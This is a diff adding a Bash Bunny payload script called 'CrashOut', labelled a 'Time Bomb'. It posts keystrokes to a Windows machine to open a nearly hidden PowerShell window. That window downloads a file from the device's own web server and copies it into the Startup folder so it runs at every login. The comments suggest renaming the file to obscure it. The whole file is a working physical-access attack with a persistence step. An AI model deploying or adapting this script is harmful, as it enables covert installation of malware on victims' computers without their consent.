@@ -1,0 +1,38 @@
+# Downloads to %appdata%, then COPIES to startup folder. Issues downloading straight to startup
+
+# Title: CrashOut
+# Author: Draco
+# Version: 1.0
+# Category: Time Bomb
+# Target: Windows 10 (works on 11, but powershell will not shrink)
+# Dependencies: GoHTTP
+# Attackmode: RNDIS_ETHERNET, HID
+# Description: Upload payload to startup folder
+
+# Instructions
+# <OPTIONAL> modify date and commands in Batman.bat
+# <OPTIONAL> add custom name after "...\Programs\Startup\<Name>" for obfuscation
+# 1. Upload payload to BB. Modify <Host_Directory> to match location
+# 2. Modify <Payload_Name> to match hosted payload
+
+ATTACKMODE HID RNDIS_ETHERNET
+
+# Navigate to directory to host, spin up server
+LED STAGE1
+cd /home/draco
+gohttp -p 80 &
+
+# Open obfuscated powershell, downloads payload from BB and places it in startup folder. Prints success or fail string. Exits
+LED STAGE2
+Q GUI r
+QUACK DELAY 300
+QUACK STRING "powershell.exe -NoExit -Command \"[console]::WindowHeight=1; [console]::WindowWidth=10\""
+QUACK ENTER
+QUACK DELAY 300
+QUACK STRING "Invoke-WebRequest -Uri \"http://172.16.64.1/<Payload_Name>/\" -OutFile \"\$env:APPDATA\\<Payload_Name>\"; if (\$?) { Write-Host \"Success!\" -ForegroundColor Green; Start-Sleep -Seconds 1 } else { Write-Host \"Fail\" -ForegroundColor Red; Start-Sleep -Seconds 1}"
+QUACK ENTER
+QUACK DELAY 300
+QUACK STRING "Copy-Item -Path \"\$env:APPDATA\\<Payload_Name>\" -Destination \"\$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" -Force; if (\$?) { Write-Host \"Success!\" -ForegroundColor Green; Start-Sleep -Seconds 1; Remove-Item -Path \"\$env:APPDATA\\<Payload_Name>\"; exit } else { Write-Host \"Fail\" -ForegroundColor Red; Start-Sleep -Seconds 1; Remove-Item -Path \"\$env:APPDATA\\<Payload_Name>\"; exit }"
+QUACK ENTER
+
+LED FINISH
